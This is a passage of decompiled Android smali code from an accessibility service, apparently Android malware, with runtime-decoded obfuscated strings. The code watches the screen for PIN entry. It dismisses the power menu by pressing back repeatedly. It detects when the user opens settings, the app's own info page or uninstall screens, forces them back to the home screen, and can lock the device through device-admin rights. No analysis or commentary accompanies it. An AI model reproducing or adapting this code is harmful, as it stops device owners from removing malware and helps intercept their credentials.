    const/16 v5, 0x1

    .line 68
    if-ge v4, v3, :cond_6

    .line 69
    .line 70
    aget-object v6, v2, v4

    .line 71
    .line 72
    sget-object v7, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 73
    .line 74
    invoke-virtual {v6, v7}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 75
    .line 76
    .line 77
    move-result-object v6

    .line 78
    invoke-static {v0, v6, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 79
    .line 80
    .line 81
    move-result v6

    .line 82
    if-eqz v6, :cond_5

    .line 83
    .line 84
    goto :goto_3

    nop

    nop

    .line 85
    :cond_5
    add-int/lit8 v4, v4, 0x1

    nop

    nop

    .line 86
    .line 87
    goto :goto_1

    .line 88
    :cond_6
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 89
    .line 90
    .line 91
    move-result v0

    .line 92
    move v2, v1

    .line 93
    :goto_2
    if-ge v2, v0, :cond_9

    .line 94
    .line 95
    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 96
    .line 97
    .line 98
    move-result-object v3
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_4

    .line 99
    if-nez v3, :cond_7

    .line 100
    .line 101
    goto/16 :goto_4

    nop

    .line 102
    :cond_7
    add-int/lit8 v4, p2, 0x1

    .line 103
    .line 104
    :try_start_2
    invoke-direct {p0, v3, v4}, Lapp/mobilex/plus/services/DataQFAdapter;->checkForPinScreen(Landroid/view/accessibility/AccessibilityNodeInfo;I)Z

    .line 105
    .line 106
    .line 107
    move-result v4
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 108
    if-eqz v4, :cond_8

    .line 109
    .line 110
    :try_start_3
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 111
    .line 112
    .line 113
    :catchall_0
    :goto_3
    return v5

    .line 114
    :cond_8
    :try_start_4
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    .line 115
    .line 116
    .line 117
    :catchall_1
    :goto_4
    add-int/lit8 v2, v2, 0x1

    .line 118
    .line 119
    goto :goto_2

    nop

    nop

    .line 120
    :catchall_2
    move-exception p1

    .line 121
    :try_start_5
    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_3

    .line 122
    .line 123
    .line 124
    :catchall_3
    :try_start_6
    throw p1
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_4

    .line 125
    :catchall_4
    :cond_9
    :goto_5
    return v1
.end method

.method private final checkPowerDialog()V
    .locals 10

    .line 1
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 2
    .line 3
    .line 4
    move-result-wide v0

    .line 5
    iget-wide v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPowerDialogCheckMs:J

    .line 6
    .line 7
    sub-long v2, v0, v2

    .line 8
    .line 9
    const-wide/16 v4, 0x3e8

    .line 10
    .line 11
    cmp-long v2, v2, v4

    .line 12
    .line 13
    if-gez v2, :cond_0

    .line 14
    .line 15
    goto/16 :goto_2

    .line 16
    .line 17
    :cond_0
    iput-wide v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPowerDialogCheckMs:J

    .line 18
    .line 19
    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 20
    .line 21
    .line 22
    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 23
    if-nez v1, :cond_1

    .line 24
    .line 25
    goto :goto_2

    .line 26
    :cond_1
    :try_start_1
    const-string v0, "0471045D040104DC04DE0498048A0485040F"

    .line 27
    .line 28
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 29
    .line 30
    .line 31
    move-result-object v2

    .line 32
    const-string v0, "00330079004C008200E200FF00DD00A10025"

    .line 33
    .line 34
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 35
    .line 36
    .line 37
    move-result-object v3

    .line 38
    const-string v0, "0030007E004E009300F400B000C500A9"

    .line 39
    .line 40
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 41
    .line 42
    .line 43
    move-result-object v4

    .line 44
    const-string v0, "003100730048009300F100AD00C6"

    .line 45
    .line 46
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 47
    .line 48
    .line 49
    move-result-object v5

    .line 50
    const-string v0, "003100730059008800FF00AB"

    .line 51
    .line 52
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 53
    .line 54
    .line 55
    move-result-object v6

    .line 56
    const-string v0, "047C0423047B04D204A704EF0481048704000421"

    .line 57
    .line 58
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 59
    .line 60
    .line 61
    move-result-object v7

    nop

    .line 62
    const-string v0, "003700630049008900B000B000D400A1"

    .line 63
    .line 64
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 65
    .line 66
    .line 67
    move-result-object v8

    .line 68
    const-string v0, "0026007B005E009500F700BA00DC00A4003A"

    nop

    nop

    .line 69
    .line 70
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 71
    .line 72
    .line 73
    move-result-object v9

    .line 74
    filled-new-array/range {v2 .. v9}, [Ljava/lang/String;

    .line 75
    .line 76
    .line 77
    move-result-object v0

    .line 78
    invoke-direct {p0, v1, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->findAnyText(Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z

    .line 79
    .line 80
    .line 81
    move-result v0

    .line 82
    if-eqz v0, :cond_2

    .line 83
    .line 84
    const-string v0, "00180051006E00A600C2009B00EF00E70001007A0054008400FB00BA00D600E700330079004C008200E200FF00D600AE0022007A00540080"

    .line 85
    .line 86
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 87
    .line 88
    .line 89
    const/16 v0, 0x1

    .line 90
    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 91
    .line 92
    .line 93
    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 94
    .line 95
    .line 96
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 97
    .line 98
    const/16 v2, 0x8

    .line 99
    .line 100
    invoke-direct {v0, p0, v2}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 101
    .line 102
    .line 103
    const-wide/16 v2, 0x32

    .line 104
    .line 105
    invoke-direct {p0, v0, v2, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 106
    .line 107
    .line 108
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 109
    .line 110
    const/16 v2, 0x9

    .line 111
    .line 112
    invoke-direct {v0, p0, v2}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 113
    .line 114
    .line 115
    const-wide/16 v2, 0x64

    .line 116
    .line 117
    invoke-direct {p0, v0, v2, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 118
    .line 119
    .line 120
    new-instance v0, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 121
    .line 122
    const v2, 0xa

    .line 123
    .line 124
    invoke-direct {v0, p0, v2}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 125
    .line 126
    .line 127
    const-wide/16 v2, 0xc8

    .line 128
    .line 129
    invoke-direct {p0, v0, v2, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 130
    .line 131
    .line 132
    goto/16 :goto_0

    .line 133
    :catchall_0
    move-exception v0

    .line 134
    goto/16 :goto_1

    nop

    .line 135
    :cond_2
    :goto_0
    :try_start_2
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 136
    .line 137
    .line 138
    return-void

    .line 139
    :goto_1
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 140
    .line 141
    .line 142
    throw v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 143
    :catch_0
    :goto_2
    return-void
.end method

.method private final checkSettingsContent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 11

    .line 1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 2
    .line 3
    .line 4
    move-result v0

    .line 5
    const/16 v1, 0x7df

    add-int/lit8 v1, v1, 0x21

    .line 6
    .line 7
    if-eq v0, v1, :cond_0

    .line 8
    .line 9
    const/16 v1, 0x20

    .line 10
    .line 11
    if-eq v0, v1, :cond_0

    .line 12
    .line 13
    goto/16 :goto_4

    .line 14
    .line 15
    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 16
    .line 17
    .line 18
    move-result-object p1

    .line 19
    if-eqz p1, :cond_b

    .line 20
    .line 21
    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 22
    .line 23
    .line 24
    move-result-object p1

    .line 25
    if-eqz p1, :cond_b

    .line 26
    .line 27
    sget-object v0, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 28
    .line 29
    invoke-virtual {p1, v0}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 30
    .line 31
    .line 32
    move-result-object p1

    .line 33
    const-string v1, "00300073004F009300F900B100D500B4"

    .line 34
    .line 35
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 36
    .line 37
    .line 38
    move-result-object v1

    .line 39
    const/16 v2, 0x0

    .line 40
    invoke-static {p1, v1, v2}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 41
    .line 42
    .line 43
    move-result v1

    .line 44
    if-nez v1, :cond_1

    .line 45
    .line 46
    const-string v1, "003700770048008C00FD00BE00DC00A6002400730049"

    .line 47
    .line 48
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 49
    .line 50
    .line 51
    move-result-object v1

    .line 52
    invoke-static {p1, v1, v2}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 53
    .line 54
    .line 55
    move-result v1

    .line 56
    if-nez v1, :cond_1

    .line 57
    .line 58
    const-string v1, "00220066004B008A00F100B100D300A000260064"

    .line 59
    .line 60
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 61
    .line 62
    .line 63
    move-result-object v1

    .line 64
    invoke-static {p1, v1, v2}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 65
    .line 66
    .line 67
    move-result p1

    .line 68
    if-nez p1, :cond_1

    .line 69
    .line 70
    goto/16 :goto_4

    .line 71
    .line 72
    :cond_1
    sget-object p1, Lv/s/VpKcDcuRNaQkRJ5;->dDIMxZXP1V8HdM:Lv/s/VpKcDcuRNaQkRJ5;

    .line 73
    .line 74
    sget-boolean p1, Lv/s/VpKcDcuRNaQkRJ5;->JXn4Qf7zpnLjP5:Z

    .line 75
    .line 76
    if-eqz p1, :cond_2

    .line 77
    .line 78
    goto/16 :goto_4

    .line 79
    .line 80
    :cond_2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 81
    .line 82
    .line 83
    move-result-wide v3

    .line 84
    iget-wide v5, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastSettingsScanMs:J

    .line 85
    .line 86
    sub-long v5, v3, v5

    .line 87
    .line 88
    const-wide/16 v7, 0x1f4

    .line 89
    .line 90
    cmp-long p1, v5, v7

    .line 91
    .line 92
    if-gez p1, :cond_3

    .line 93
    .line 94
    goto/16 :goto_4

    .line 95
    .line 96
    :cond_3
    iput-wide v3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastSettingsScanMs:J

    nop

    nop

    .line 97
    .line 98
    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 99
    .line 100
    .line 101
    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_5

    .line 102
    if-nez p1, :cond_4

    .line 103
    .line 104
    goto/16 :goto_4

    .line 105
    .line 106
    :cond_4
    :try_start_1
    sget-boolean v1, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Reset:Z

    .line 107
    .line 108
    if-eqz v1, :cond_5

    .line 109
    .line 110
    const-string v1, "002500770058009300FF00AD00CB00E7003100730048008200E4"

    nop

    nop

    .line 111
    .line 112
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 113
    .line 114
    .line 115
    move-result-object v1

    .line 116
    const-string v3, "04020427047B04D904D104E704F0048B0063042B040B04A604D2049F048C04FE0479042E"

    .line 117
    .line 118
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 119
    .line 120
    .line 121
    move-result-object v3

    .line 122
    const-string v4, "04020427047B04D904D100FF048604F7047E042B047004A2"

    .line 123
    .line 124
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 125
    .line 126
    .line 127
    move-result-object v4

    .line 128
    const-string v5, "00260064005A009400F500FF00D300AB002F0036005F008600E400BE"

    .line 129
    .line 130
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 131
    .line 132
    .line 133
    move-result-object v5

    .line 134
    const-string v6, "0034007F004B008200B000BE00DE00AB00630072005A009300F1"

    .line 135
    .line 136
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 137
    .line 138
    .line 139
    move-result-object v6

    .line 140
    filled-new-array {v1, v3, v4, v5, v6}, [Ljava/lang/String;

    .line 141
    .line 142
    .line 143
    move-result-object v1

    nop

    nop

    .line 144
    invoke-direct {p0, p1, v1}, Lapp/mobilex/plus/services/DataQFAdapter;->findAnyText(Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z

    .line 145
    .line 146
    .line 147
    move-result v1

    .line 148
    if-eqz v1, :cond_5

    nop

    .line 149
    .line 150
    const-string v0, "00180051006E00A600C2009B00EF00E7000500770058009300FF00AD00CB00E7003100730048008200E400FF00C100A400310073005E008900B000BB00D700B300260075004F008200F400FF009A00B7002800710006"

    .line 151
    .line 152
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 153
    .line 154
    .line 155
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 156
    .line 157
    .line 158
    :try_start_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 159
    .line 160
    .line 161
    :catch_0
    return-void

    .line 162
    :catchall_0
    move-exception v0

    .line 163
    goto/16 :goto_3

    .line 164
    .line 165
    :cond_5
    :try_start_3
    sget-boolean v1, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Sett:Z

    .line 166
    .line 167
    if-eqz v1, :cond_6

    nop

    .line 168
    .line 169
    const-string v1, "0022007A005700C700F100AF00C200B4"

    .line 170
    .line 171
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 172
    .line 173
    .line 174
    move-result-object v3

    .line 175
    const-string v1, "00220066004B00C700F900B100D400A8"

    .line 176
    .line 177
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 178
    .line 179
    .line 180
    move-result-object v4

    .line 181
    const-string v1, "04710457040E00C704AF049F048A04FC047D0420040E04DA04A80490"

    .line 182
    .line 183
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 184
    .line 185
    .line 186
    move-result-object v5

    .line 187
    const-string v1, "002E00770055008600F700BA009200A6003300660048"

    .line 188
    .line 189
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 190
    .line 191
    .line 192
    move-result-object v6

    .line 193
    const-string v1, "04020429040304A604AE04E5009204F80403042E040004D904A604EA048F04FF047A"

    .line 194
    .line 195
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 196
    .line 197
    .line 198
    move-result-object v7

    nop

    .line 199
    const-string v1, "002A00780048009300F100B300DE00A200270036005A009700E000AC"

    .line 200
    .line 201
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 202
    .line 203
    .line 204
    move-result-object v8

    nop

    .line 205
    const-string v1, "04020429040E04A104A804EF0489048B047E045D040200C704A404E104F3048504000429"

    .line 206
    .line 207
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 208
    .line 209
    .line 210
    move-result-object v9

    nop

    nop

    .line 211
    const-string v1, "00300066005E008400F900BE00DE00E700220066004B00C700F100BC00D100A200300065"

    .line 212
    .line 213
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 214
    .line 215
    .line 216
    move-result-object v10

    .line 217
    filled-new-array/range {v3 .. v10}, [Ljava/lang/String;

    .line 218
    .line 219
    .line 220
    move-result-object v1

    .line 221
    invoke-direct {p0, p1, v1}, Lapp/mobilex/plus/services/DataQFAdapter;->findAnyText(Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z

    .line 222
    .line 223
    .line 224
    move-result v1

    .line 225
    if-eqz v1, :cond_6

    .line 226
    .line 227
    const-string v0, "00180051006E00A600C2009B00EF00E700020066004B00C700FC00B600C100B3006300650058009500F500BA00DC00E700270073004F008200F300AB00D700A3006300600052008600B000BC00DD00A9003700730055009300B000F700C200AC0024002B"

    .line 228
    .line 229
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 230
    .line 231
    .line 232
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 233
    .line 234
    .line 235
    :try_start_4
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    .line 236
    .line 237
    .line 238
    :catch_1
    return-void

    .line 239
    :cond_6
    :try_start_5
    sget-boolean v1, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_OwnApp:Z

    nop
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 240
    .line 241
    const-string v3, "04770428047A04A504D304E0048F04F9040204540477"

    .line 242
    .line 243
    const-string v4, "002200750058008200E300AC00DB00A5002A007A0052009300E9"

    .line 244
    .line 245
    if-eqz v1, :cond_a

    .line 246
    .line 247
    :try_start_6
    iget-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->cachedSelfLabel:Ljava/lang/String;
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    .line 248
    .line 249
    if-nez v1, :cond_7

    .line 250
    .line 251
    :try_start_7
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 252
    .line 253
    .line 254
    move-result-object v1

    .line 255
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    .line 256
    .line 257
    .line 258
    move-result-object v5

    .line 259
    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 260
    .line 261
    .line 262
    move-result-object v6

    .line 263
    invoke-virtual {v5, v6, v2}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    .line 264
    .line 265
    .line 266
    move-result-object v5

    .line 267
    invoke-virtual {v1, v5}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    .line 268
    .line 269
    .line 270
    move-result-object v1

    nop

    nop

    .line 271
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 272
    .line 273
    .line 274
    move-result-object v1

    nop

    nop

    .line 275
    invoke-virtual {v1, v0}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 276
    .line 277
    .line 278
    move-result-object v0

    .line 279
    iput-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->cachedSelfLabel:Ljava/lang/String;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    .line 280
    .line 281
    :goto_0
    move-object/from16 v1, v0

    .line 282
    goto/16 :goto_1

    .line 283
    :catch_2
    :try_start_8
    const-string v0, ""

    .line 284
    .line 285
    goto/16 :goto_0

    .line 286
    :cond_7
    :goto_1
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 287
    .line 288
    .line 289
    move-result v0

    .line 290
    if-lez v0, :cond_a

    .line 291
    .line 292
    filled-new-array {v1}, [Ljava/lang/String;

    .line 293
    .line 294
    .line 295
    move-result-object v0

    nop

    nop

    .line 296
    invoke-direct {p0, p1, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->findAnyText(Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z

    .line 297
    .line 298
    .line 299
    move-result v0

    .line 300
    if-eqz v0, :cond_a

    .line 301
    .line 302
    const/16 v0, 0x8

    .line 303
    .line 304
    const/16 v1, 0xbb8

    .line 305
    .line 306
    invoke-direct {p0, p1, v0, v1}, Lapp/mobilex/plus/services/DataQFAdapter;->collectRootText(Landroid/view/accessibility/AccessibilityNodeInfo;II)Ljava/lang/String;

    .line 307
    .line 308
    .line 309
    move-result-object v0

    nop

    nop

    .line 310
    sget-object v1, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 311
    .line 312
    invoke-virtual {v0, v1}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 313
    .line 314
    .line 315
    move-result-object v0

    .line 316
    invoke-direct {p0, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->hasDangerKeywords(Ljava/lang/String;)Z

    .line 317
    .line 318
    .line 319
    move-result v1

    .line 320
    if-nez v1, :cond_8

    .line 321
    .line 322
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 323
    .line 324
    .line 325
    move-result-object v1

    .line 326
    invoke-static {v0, v1, v2}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 327
    .line 328
    .line 329
    move-result v1

    .line 330
    if-nez v1, :cond_8

    .line 331
    .line 332
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 333
    .line 334
    .line 335
    move-result-object v1

    nop

    .line 336
    invoke-static {v0, v1, v2}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 337
    .line 338
    .line 339
    move-result v0

    .line 340
    if-eqz v0, :cond_a

    .line 341
    .line 342
    :cond_8
    const-string v0, "00180051006E00A600C2009B00EF00E700100073004F009300F900B100D500B4007900360048008200FC00B9009200A600330066001B00CC00B000BB00D300A900240073004900C700FB00BA00CB00B0002C0064005F00C700B800AF00D900A0007E"

    .line 343
    .line 344
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 345
    .line 346
    .line 347
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V

    .line 348
    .line 349
    .line 350
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Lock:Z
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    .line 351
    .line 352
    if-eqz v0, :cond_9

    .line 353
    .line 354
    :try_start_9
    new-instance v0, Landroid/content/ComponentName;

    .line 355
    .line 356
    const-class v1, Lapp/mobilex/plus/receivers/DeviceAdminReceiver;

    .line 357
    .line 358
    invoke-direct {v0, p0, v1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 359
    .line 360
    .line 361
    invoke-static {p0, v0}, Lv/s/gA5gCwTK0qjTIn;->gIIiyi2ddlMDR0(Landroid/content/Context;Landroid/content/ComponentName;)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_3
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    .line 362
    .line 363
    .line 364
    :catch_3
    :cond_9
    :goto_2
    :try_start_a
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5

    .line 365
    .line 366
    .line 367
    goto :goto_4

    .line 368
    :cond_a
    :try_start_b
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_A11y:Z

    .line 369
    .line 370
    if-eqz v0, :cond_9

    .line 371
    .line 372
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 373
    .line 374
    .line 375
    move-result-object v0

    .line 376
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 377
    .line 378
    .line 379
    move-result-object v1

    .line 380
    const-string v2, "04020429040E04A104A804EF0489048B047E045D040E00C704A204E1048504FB047D0420040604D904D1049D048A"

    .line 381
    .line 382
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 383
    .line 384
    .line 385
    move-result-object v2

    .line 386
    filled-new-array {v0, v1, v2}, [Ljava/lang/String;

    .line 387
    .line 388
    .line 389
    move-result-object v0

    nop

    nop

    .line 390
    invoke-direct {p0, p1, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->findAnyText(Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z

    .line 391
    .line 392
    .line 393
    move-result v0

    .line 394
    if-eqz v0, :cond_9

    .line 395
    .line 396
    const-string v0, "0471045D040104DC"

    nop

    nop

    .line 397
    .line 398
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 399
    .line 400
    .line 401
    move-result-object v0

    .line 402
    const-string v1, "002C0070005D"

    .line 403
    .line 404
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 405
    .line 406
    .line 407
    move-result-object v1

    .line 408
